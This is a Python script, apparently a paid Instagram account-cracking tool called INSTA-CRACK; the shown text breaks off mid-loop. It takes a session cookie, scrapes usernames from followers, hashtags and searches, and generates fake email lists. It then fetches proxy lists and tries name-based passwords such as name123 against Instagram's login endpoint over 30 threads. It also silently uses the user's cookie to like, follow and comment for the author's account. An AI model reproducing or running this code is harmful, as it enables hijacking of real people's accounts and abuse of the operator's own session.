import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"

#LOGO
___logo___ = (f"""{H}
{T}╔════════════════════════════════════════════════════════════════════════════════════════╗
{T}║                                                                                        ║
{T}║                                                                                        ║
{T}║                                                                                        ║
{T}║  {B}██╗███╗   ██╗███████╗████████╗ █████╗        ██████╗██████╗  █████╗  ██████╗██╗  ██╗  {T}║
{T}║  {B}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝  {T}║
{T}║  {B}██║██╔██╗ ██║███████╗   ██║   ███████║█████╗██║     ██████╔╝███████║██║     █████╔╝   {T}║
{T}║  {U}██║██║╚██╗██║╚════██║   ██║   ██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗   {T}║
{T}║  {U}██║██║ ╚████║███████║   ██║   ██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗  {T}║
{T}║  {U}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  {T}║
{T}║                                                                                        {T}║
{T}║                                                                        {A}VERSION{P}: {J}04.04  {T}║
{T}║                                                                                        {T}║
{T}╚════════════════════════════════════════════════════════════════════════════════════════╝

{T}╔════════════════════════════════════════════════════════════════════════════════════════╗
{T}║                            {A} MULTI BRUTEFORCE INSTAGRAM                                 {T}║
{T}║                            {B} AUTHOR    {A}: {U}MN4WN-777                                      {T}║
{T}║                            {B} Github    {A}: {U}github.com/MN4WN1-777                          {T}║
{T}║                            {B} Facebook  {A}: {U}Zeuz Toktok                                    {T}║
{T}╚════════════════════════════════════════════════════════════════════════════════════════╝
""")

def xoshnaw(): 
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "-".join(uuid) 
  print("\x1b[1;92m╚═➣ YOUR ID\x1b[1;91m : "+id) 
  try: 
    httpCaht = requests.get("https://github.com/MN4WN1-777/ignew/blob/master/list.txt").text 
    if id in httpCaht: 
      print("\033[1;92m╚═➣ YOUR ID IS ACTIVE...!") 
      msg = str(os.geteuid()) 
      time.sleep(0.3) 
      pass 
    else: 
      print("\x1b[1;91m╚═➣ ID ANDA TIDAK TERDAFTAR  ") 
      print("\x1b[38;5;208mSILAHKAN COPY ID ANDA KIRIM KE AUTHOR !!!") 
      os.system('xdg-open https://wa.me/+6282277004825?text=BANG+SAYA+MAU+ORDER+SC+CRACK+IG+KAMU+BANG') 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     xoshnaw() 
xoshnaw()
# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    print(f"{T}╔════════════════════════════════════════════════════════════════════════════════════════╗")
    print(f"{T}║                                                                                        {T}║")
    print(f"{T}║ {A} [{H}❖{H}{A}] {B} GUNAKAN COOKIE AKUN TUMBAL INSTAGRAM ANDA {M}!!!                                    {T}║")
    print(f"{T}║ {A} [{H}❖{H}{A}] {J} CARA AMBIL COOKIE KETIK [{H}OPEN{T}]{A}                                                   {T}║")
    print(f"{T}║                                                                                        {T}║")
    print(f"{T}╚════════════════════════════════════════════════════════════════════════════════════════╝")
    ___cookie = input(f"{T}╚═➣{H} MASUKAN COOKIE :{A} ")
    if ___cookie in ['open', 'Open', 'OPEN']:
        print(f"{T}╚═➣{M} You will be directed to the creator of this program !!!");sleep(3);os.system('xdg-open https://wa.me/+6282277004825?text=Bg+Cara+Ambil+Cookies+Ig+Kek+Mana?');___login___()
    elif ___cookie in ['', ' ']:
        exit(f"{T}[{Z}!{T}]{M} Do not Empty")
    else:
        try:
            ___userid = re.search('ds_user_id=(.*?);', ___cookie);open('Data/user.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Data/coki.txt', 'w').write(___cookie)
            os.system('xdg-open https://wa.me/+6282277004825?text=MAKASIH+BANG+SUDAH+AKTIFIN+ID+GUA')
            print(f"{T}╚═➣{U} Welcome :{J} {___roz['full_name']}");___follow___()
        except (AttributeError, KeyError):
            exit(f"{T}╚═➣{M} COOKIE ANDA KADARLUARSA SILAHKAN PERBARUI TERLEBIH DAHULU !!!")
        except (ConnectionError):
            exit(f"{T}[{J}!{T}]{J} Connection Error")
# Follow Cookie
def ___follow___():
    try:
        ___cookie = open('Data/coki.txt', 'r').read()
        ___session = re.search('sessionid=(.*?);', ___cookie)
        ___teks = random.choice(['Hello And Welcome ❤️'])
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        with requests.Session() as ses:
            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text #Jangan Di ubah!
            if '"status":"ok"' in str(___follow):
                print(f"{T}╚═➣{H} LOGIN BERHASIL");___menu___()
            else:
                print(f"{T}╚═➣{M} COOKIE INVALID !!!");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
    except Exception as e:
        print(f"{T}╚═➣{M} COOKIE INVALID !!!");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
# Menu
def ___menu___():
    try:
        os.system('clear')
        print(___logo___)
        ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{open("Data/user.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['user']
        print(f"{T}╔════════════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{T}║ [{Z}*{T}]{B} Welcome  :{U} {___roz['full_name']}                                                                  {T}║")
        print(f"{T}║ [{Z}*{T}]{B} User     :{U} {___roz['username']}                                                              {T}║")
        print(f"{T}║ [{Z}*{T}]{B} Follower :{U} {___roz['follower_count']}                                                                     {T}║")
        print(f"{T}║ [{Z}*{T}]{B} Status   :{H} PREMIUM                                                                 {T}║")
        print(f"{T}╚════════════════════════════════════════════════════════════════════════════════════════╝")
    except (IOError):
        print(f"{T}╚═➣{M} COOKIE INVALID !!!");sleep(3);___login___()
    except (KeyError):
        print(f"{T}╚═➣{M} COOKIE INVALID !!!");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(3);___login___()
    except (IOError):
        exit(f"{T}[{J}!{T}]{J} Connection Error")
    print(f"{T}╔════════════════════════════════════════════════════════════════════════════════════════╗")
    print(f"{T}║                                           {T}║                                            {T}║")
    print(f"{T}║ {T}[{Z}1{T}]{B} Dump Username From {H}Following          {T}║  {T}[{Z}7{T}]{B} Dump Username From {U}Query              {T}║")
    print(f"{T}║ {T}[{Z}2{T}]{B} Dump Username From {U}Followers          {T}║  {T}[{Z}8{T}]{B} Dump User {U}From Email                  {T}║")
    print(f"{T}║ {T}[{Z}3{T}]{B} Dump Username From {U}Activity           {T}║  {T}[{Z}9{T}]{J} Start Crack {T}[{H}Fast{T}]{H}                    {T}║")
    print(f"{T}║ {T}[{Z}4{T}]{B} Dump Username From {U}Home               {T}║  {T}[{Z}0{T}]{B} List Total {A}Crack                      {T}║")
    print(f"{T}║ {T}[{Z}5{T}]{B} Dump Username From {U}Hashtag            {T}║  {T}[{Z}A{T}]{H} Log out {T}[{M}Exit{T}]{M}                        {T}║")
    print(f"{T}║ {T}[{Z}6{T}]{B} Dump Username From {U}Search             {T}║                                            {T}║")
    print(f"{T}║                                           {T}║                                            {T}║")
    print(f"{T}╚════════════════════════════════════════════════════════════════════════════════════════╝")
    ___pilih = input(f"{T}║ {T}[{A}?{T}]{U} Choose {B}:{J} ")
    if ___pilih in ['1','01']:
        ___mengikuti___()
    elif ___pilih in ['2','02']:
        ___pengikut___()
    elif ___pilih in ['3','03']:
        ___activity___()
    elif ___pilih in ['4','04']:
        ___beranda___()
    elif ___pilih in ['5','05']:
        ___hastag___()
    elif ___pilih in ['6','06']:
        ___search___()
    elif ___pilih in ['7','07']:
        ___query___()
    elif ___pilih in ['8','08']:
        ___email___()
    elif ___pilih in ['9','09']:
        ___proxy___()
    elif ___pilih in ['0','00']:
        try:
            print(f"{T}║ [{Z}1{T}]{H} Total Ok")
            print(f"{T}║ [{Z}2{T}]{J} Total Cp")
            print(f"{T}║ [{Z}3{T}]{U} Return")
            ___hasil = input(f"{T}║ [{H}?{T}]{B} Choose :{A} ")
            if ___hasil in ['1','01']:
                print(f"{H} ");os.system('cat Results/Ok.txt')
            elif ___hasil in ['2','02']:
                print(f"{J} ");os.system('cat Results/Cp.txt')
            elif ___hasil in ['3','03']:
                ___menu___()
            else:
                print(f"{T}[{M}!{T}]{M} Wrong Input");sleep(2);___menu___()
        except:pass
    elif ___pilih in ['a','A']:
        print(f"{T}[{J}!{T}]{J} Delete Cookie...");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(2);___login___()
    else:
        print(f"{T}[{M}!{T}]{M} Wrong Input");sleep(2);___menu___()
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input(f"{T}║ [{J}?{T}]{B} User :{U} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{T}[{M}!{T}]{M} use Username")
        else:
            ___roz = requests.get(f'https://z-p42.www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{T}║ [{H}✔{T}]{M} Name :{J} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/following/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{A}{z['username']}<=>{z['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        print(f"{T}[{M}!{T}]{M} Dump Fail");sleep(2);___menu___()
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{M} Connection Error")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input(f"\n{T}[{Z}?{T}]{B} User :{U} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{T}[{M}!{T}]{M} use Username")
        else:
            ___roz = requests.get(f'https://i.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{T}[{A}?{T}]{Z} Name :{J} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{A}{z['username']}<=>{z['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        exit(f"{T}[{M}!{T}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{M} Connection Error")
# Dump Activity
def ___activity___():
    try:
        ___file = input(f"\n{T}[{Z}?{T}]{B} Name File :{U} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get('https://z-p42.www.instagram.com/accounts/activity/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\n{T}[{Z}*{T}]{H} Finisehd...")
            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except Exception as e:
        exit(f"{T}[{M}!{T}]{M} {e}")
# Dump Beranda
def ___beranda___():
    try:
        ___file = input(f"\n{T}[{Z}?{T}]{B} Name File :{U} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get('https://i.instagram.com/api/v1/feed/reels_tray/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['tray']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{z['user']['username']}<=>{z['user']['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        exit(f"{T}[{M}!{T}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{J} Connection Error")
# Dump Hastag
def ___hastag___():
    try:
        ___tag = input(f"\n{T}[{Z}?{T}]{B} Hashtag :{U} ").replace('#','')
        if ___tag in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        ___file = input(f"{T}[{Z}?{T}]{U} Name File :{B} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        else:
            print(f"{A} ")
            ___roz = requests.get(f'https://z-p42.www.instagram.com/explore/tags/{___tag}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except Exception as e:
        exit(f"{T}[{M}!{T}]{J} {e}")
# Dump Search
def ___search___():
    try:
        ___user = input(f"\n{T}[{Z}?{T}]{B} User :{U} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{T}[{M}!{T}]{M} Use Username")
        else:
            ___roz = requests.get(f'https://z-p42.www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{T}[{Z}?{T}]{B} Name :{U} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___roz["id"]}&include_friendship_status=true', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        exit(f"{T}[{M}!{T}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{J} Connection Error")
# Dump Query
def ___query___():
    try:
        ___query = input(f"\n{T}[{Z}?{T}]{B} Query :{U} ")
        if ___query in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        else:
            print(f"{A} ")
            ___file = ___query.replace(' ','_')+'.txt'
            ___roz = requests.get(f'https://z-p42.instagram.com/web/search/topsearch/?context=blended&query={___query}&rank_token=0.3953592318270893&count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['users']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{z['user']['username']}<=>{z['user']['full_name']}")
            print(f"\n{T}[{Z}*{T}]{H} Finished...")
            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
            input(f"{T}[{J}Return{T}]{A}");___menu___()
    except (KeyError):
        exit(f"{T}[{M}!{T}]{M} Dump Failed")
    except (ConnectionError):
        exit(f"{T}[{M}!{T}]{J} Connection Error")
# Dump Dari Email
def ___email___():
    try:
        ___nama = input(f"\n{T}[{Z}?{T}]{B} Name :{U} ").replace(' ','')
        if ___nama in ['',' ']:
            exit(f"{T}[{M}!{T}]{M} Fill")
        ___domain = input(f"{T}[{Z}?{T}]{B} Domain :{U} ")
        if ___domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___limit = int(input(f"{T}[{Z}?{T}]{J} Limit :{A} "))
            if ___limit >=1001:
                exit(f"{T}[{J}!{T}]{M} maximun 1000")
            else:
                print(f"{A} ")
                ___file = 'Dump/'+___nama+'.txt'
                for _ in range(___limit):
                    ___nomor = random.randint(1, 999)
                    ___user = ___nama + str(___nomor) + ___domain + '<=>' + ___nama + ' ' + str(___nomor)
                    open(___file, 'a').write(f'{___user}\n')
                    print(f"{___user}")
                print(f"\n{T}[{Z}*{T}]{H} Finished...")
                print(f"{T}[{Z}?{T}]{B} File Saved in :{U} {___file}")
                input(f"{T}[{J}Return{T}]{A}");___menu___()
        else:
            exit(f"{T}[{J}!{T}]{J} Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'")
    except Exception as e:
        exit(f"{T}[{M}!{T}]{M} {e}")
# Proxy
def ___proxy___():
    try:
        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('Data/proxy.txt', 'w').write(___roz)
    except Exception as e:
        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy2.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print(f"{T}╔════════════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{T}║                                                                                        {T}║")
        print(f"{T}║ [{Z}1{T}]{U} Enter {B}Password {T}[{H}Name, Name123, Name12345{T}]                                          {T}║")
        print(f"{T}║ [{Z}2{T}]{U} Enter {B}Password {T}[{H}name, name123, name1234, name12345{T}]                                {T}║")
        print(f"{T}║ [{Z}3{T}]{U} Enter {B}Password {T}[{M}name, name123, name1234, name12345, name123456{T}]                    {T}║")
        print(f"{T}║ [{Z}4{T}]{U} Enter {B}Password {H}Manual {T}[{M}>5{T}]                                                         {T}║")
        print(f"{T}║                                                                                        {T}║")
        print(f"{T}╚════════════════════════════════════════════════════════════════════════════════════════╝")
        ___pilih = input(f"{T}║ [{J}?{T}]{J} Choose :{A} ")
        if ___pilih in ['4','04']:
            pwx = input(f"{T}║ [{J}?{T}]{H} Password :{Z} ").split(',')
        try:
            self.___dump = input(f"{T}║ [{J}?{T}]{U} File Dump :{B} ")
            self.___file = open(self.___dump, 'r').read().splitlines()
        except (IOError):
            print(f"{T}║ [{M}!{T}]{M} File Not Found");sleep(2);___menu___()
        try:
            print(f"\n{T}║ [{Z}•{T}]{H} Total Ok Saved Di Results/Ok.txt")
            print(f"{T}║ [{Z}•{T}]{J} Total Cp Saved Di Results/Cp.txt\n")
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, nama = ___user.split('<=>')
                    z = nama.split(' ')
                    if ___pilih in ['1','01']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'12345']
                    elif ___pilih in ['2','02']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    elif ___pilih in ['3','03']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
                    elif ___pilih in ['4','04']:
                        password = pwx
                    else:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
            exit(f"\n{T}╚═➣ [{H}Finished{T}]{A}")
        except (ValueError):
            exit(f"{T}[{M}!{T}]{M} Crack is complete, there seems to be an error, please re-dump!")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open('Data/ua.txt', 'r').read()
        except (IOError):
            ___useragent = ('Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; ru_RU; 99640911)')
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://z-p42.www.instagram.com/')
                ___login = ('https://z-p42.instagram.com/accounts/login/ajax/')
                ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                ___csrf = requests.get(___url).cookies['csrftoken']
                ___data = {'username': uid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                'queryParams': {},
                'optIntoOneTap': 'false'}
                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://i.instagram.com/api/v1/accounts/login/',
                'x-csrftoken': ___csrf}
                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                    if 'userId' in str(response):
